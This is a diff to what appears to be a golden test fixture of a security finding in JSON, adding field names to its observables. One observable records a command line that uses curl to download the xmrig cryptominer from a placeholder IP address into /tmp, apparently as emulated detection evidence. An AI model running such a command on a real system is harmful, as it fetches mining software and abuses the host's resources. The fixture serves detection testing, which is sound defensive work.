@@ -81,21 +81,25 @@
   },
   "observables": [
     {
+      "name": "evidences.process.cmd_line",
       "type_id": 13,
       "type": "Command Line",
       "value": "curl -s --max-time 2 http://192.0.2.10/xmrig -o /tmp/xmrig-emul"
     },
     {
+      "name": "evidences.process.name",
       "type_id": 9,
       "type": "Process Name",
       "value": "curl"
     },
     {
+      "name": "evidences.process.file.path",
       "type_id": 7,
       "type": "File Name",
       "value": "/usr/bin/curl"
     },
     {
+      "name": "device.hostname",
       "type_id": 1,
       "type": "Hostname",
       "value": "golden-host"
